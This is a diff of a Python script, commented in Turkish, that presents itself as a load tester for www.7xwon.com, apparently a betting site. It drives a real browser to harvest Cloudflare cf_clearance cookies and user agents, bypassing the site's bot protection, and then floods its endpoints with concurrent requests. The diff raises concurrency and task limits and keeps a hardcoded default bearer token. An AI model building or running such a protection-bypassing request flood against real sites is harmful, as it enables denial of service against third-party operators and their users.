@@ -1,7 +1,6 @@
 """
-Otomatik Cloudflare Bypass + Modern Canlı Dashboard Load Tester
-Her test başladığında veya 403 alındığında tarayıcı üzerinden otomatik taze cf_clearance üretir,
-kesintisiz yük testine devam eder.
+Otomatik Cloudflare Bypass + Modern Canli Dashboard Load Tester
+Windows CMD kilitlenmelerini onleyen, anlik kendini yenileyen temiz arayuz.
 """
 
 import asyncio
@@ -9,13 +8,12 @@ import time
 import argparse
 import sys
 import random
-import threading
 from curl_cffi.requests import AsyncSession
 from rich.console import Console
 from rich.table import Table
 from rich.live import Live
 from rich.panel import Panel
-from rich.layout import Layout
+from rich.text import Text
 from rich import box
 
 try:
@@ -36,7 +34,7 @@ DEFAULT_PAYLOAD = {
 
 
 def get_fresh_cookie_and_ua():
-    """Arka planda gerçek tarayıcı ile 7xwon'u açıp taze cf_clearance çerezini ve UA'yı çeker."""
+    """Arka planda gercek tarayici ile 7xwon'u acip taze cf_clearance cerezini ve UA'yi ceker."""
     if not uc:
         return "", ""
     try:
@@ -46,10 +44,9 @@ def get_fresh_cookie_and_ua():
         cookies = driver.get_cookies()
         ua = driver.execute_script("return navigator.userAgent")
         driver.quit()
-        cf = [c for c in cookies if c["name"] == "cf_clearance"]
         cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
         return cookie_str, ua
-    except Exception as e:
+    except Exception:
         return "", ""
 
 
@@ -109,50 +106,44 @@ def make_dashboard(m: Metrics):
     s = m.calc_stats()
     rem = max(0, int(m.duration - s["elapsed"]))
 
-    # Summary table
-    t_summary = Table(box=box.ROUNDED, expand=True)
-    t_summary.add_column("Hedeflenen", justify="center", style="cyan bold")
-    t_summary.add_column("Anlik RPS", justify="center", style="bold green" if m.instant_rps > 0 else "yellow")
-    t_summary.add_column("Toplam RPS", justify="center", style="blue")
-    t_summary.add_column("Kalan Sure", justify="center", style="magenta bold")
-
-    t_summary.add_row(
-        f"{m.target_rps} RPS",
-        f"{m.instant_rps:.1f} req/s",
-        f"{s['overall_rps']:.1f} req/s",
-        f"{rem} sn"
+    table = Table(
+        title=f"[bold bright_blue]LOAD TEST CANLI PANEL[/]  |  Mod: [bold cyan]{m.mode.upper()}[/]  |  Hedef: [bold yellow]{m.target_rps} RPS[/]",
+        box=box.ROUNDED,
+        header_style="bold bright_white",
+        expand=True
     )
 
-    # Detailed counters
-    t_detail = Table(box=box.SIMPLE_HEAVY, expand=True)
-    t_detail.add_column("Gonderilen", justify="center")
-    t_detail.add_column("Basarili (200 OK)", justify="center", style="green bold")
-    t_detail.add_column("Hata", justify="center", style="red bold" if m.failed > 0 else "dim")
-    t_detail.add_column("Basari Orani", justify="center", style="green" if s["success_rate"] > 90 else "red")
-    t_detail.add_column("Ort. Latency", justify="center")
-    t_detail.add_column("p95", justify="center", style="yellow")
-    t_detail.add_column("p99", justify="center", style="red")
+    table.add_column("Anlik RPS", justify="center", style="bold green" if m.instant_rps > 0 else "yellow")
+    table.add_column("Toplam RPS", justify="center", style="cyan")
+    table.add_column("Gonderilen", justify="center", style="white")
+    table.add_column("Basarili (200)", justify="center", style="bold green")
+    table.add_column("Hata", justify="center", style="bold red" if m.failed > 0 else "dim")
+    table.add_column("Basari Orani", justify="center", style="green" if s["success_rate"] >= 95 else "red")
+    table.add_column("Ort. Latency", justify="center", style="magenta")
+    table.add_column("p95", justify="center", style="yellow")
+    table.add_column("Kalan", justify="center", style="bold cyan")
 
-    t_detail.add_row(
+    table.add_row(
+        f"{m.instant_rps:.1f} /s",
+        f"{s['overall_rps']:.1f} /s",
         str(m.total_sent),
         str(m.ok),
         str(m.failed),
         f"%{s['success_rate']:.1f}",
         f"{s['avg_ms']:.1f} ms",
         f"{s['p95']:.1f} ms",
-        f"{s['p99']:.1f} ms",
+        f"{rem} sn"
     )
 
-    # Status codes pill
-    codes = "  ".join([f"[bold {'green' if k=='200' else 'red'}]{k}[/]: {v}" for k, v in m.status_codes.items()]) or "Henuz istek yok"
+    codes = "   ".join([f"[{'bold green' if k=='200' else 'bold red'}]{k}[/]: {v}" for k, v in m.status_codes.items()]) or "Bekleniyor..."
+    footer = Text.from_markup(f"  [bold]HTTP Kod Dagilimi:[/] {codes}")
 
-    layout = Layout()
-    layout.split_column(
-        Layout(Panel(t_summary, title=f"[bold white]LOAD TEST CANLI PANEL[/] - Mod: [bold cyan]{m.mode}[/]", border_style="bright_blue"), size=5),
-        Layout(Panel(t_detail, title="[bold white]PERFORMANS METRIKLERI[/]", border_style="cyan"), size=5),
-        Layout(Panel(f"HTTP Kod Dagilimi:  {codes}", border_style="dim"), size=3)
+    return Panel(
+        table,
+        subtitle=footer,
+        border_style="bright_blue",
+        padding=(0, 1)
     )
-    return layout
 
 
 async def worker(session: AsyncSession, url: str, payload: dict, headers: dict, metrics: Metrics, timeout: float):
@@ -176,23 +167,23 @@ async def main():
     parser.add_argument("--token", type=str, default="sGbBgXsmnX78Gp2BYZnz", help="Bearer token")
     parser.add_argument("--cookie", type=str, default="", help="Cookie / cf_clearance")
     parser.add_argument("--timeout", type=float, default=6.0, help="Istek timeout")
-    parser.add_argument("--concurrency", type=int, default=50, help="Es zamanli worker sayisi")
+    parser.add_argument("--concurrency", type=int, default=100, help="Es zamanli worker sayisi")
     args = parser.parse_args()
 
     console = Console()
     cookie = args.cookie
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
 
-    # Otomatik Cloudflare Bypass: Cookie verilmediyse otomatik taze token al
+    # Otomatik Cloudflare Bypass
     if not cookie:
-        console.print("[cyan][*] Cloudflare korumasi taranıyor, otomatik cf_clearance aliniyor...[/]")
+        console.print("[cyan][*] Cloudflare kontrol ediliyor, taze oturum aliniyor...[/]")
         fresh_cookie, fresh_ua = get_fresh_cookie_and_ua()
         if fresh_cookie:
             cookie = fresh_cookie
             ua = fresh_ua or ua
             console.print("[green][+] Cloudflare oturumu basariyla alindi![/]")
         else:
-            console.print("[yellow][!] Otomatik oturum alinamadi, varsayilan basliklarla deneniyor...[/]")
+            console.print("[yellow][!] Otomatik oturum pas gecildi, standart basliklar kullaniliyor...[/]")
 
     headers = {
         "Origin": "https://www.7xwon.com",
@@ -208,7 +199,7 @@ async def main():
 
     metrics = Metrics(args.rps, args.duration, args.target)
 
-    # Canlı maç ID'lerini çek
+    # Canli mac ID'lerini cek
     event_ids = [36246068, 36245965, 36269546]
     async with AsyncSession() as s:
         try:
@@ -227,7 +218,7 @@ async def main():
         async with sem:
             await worker(sess, url, body, headers, metrics, args.timeout)
 
-    # Saniyelik anlık RPS hesaplayıcı
+    # Anlik RPS ticker
     async def ticker():
         while True:
             await asyncio.sleep(1.0)
@@ -237,7 +228,7 @@ async def main():
 
     ticker_task = asyncio.create_task(ticker())
 
-    # Canlı kendini yenileyen terminal dashboard'u
+    # Canli yenilenen panel
     with Live(make_dashboard(metrics), refresh_per_second=4, console=console) as live:
         async with AsyncSession() as session:
             start = time.time()
@@ -265,7 +256,7 @@ async def main():
                 if delay > 0:
                     await asyncio.sleep(delay)
 
-                if len(tasks) > 600:
+                if len(tasks) > 1000:
                     tasks = [t for t in tasks if not t.done()]
 
             if tasks:
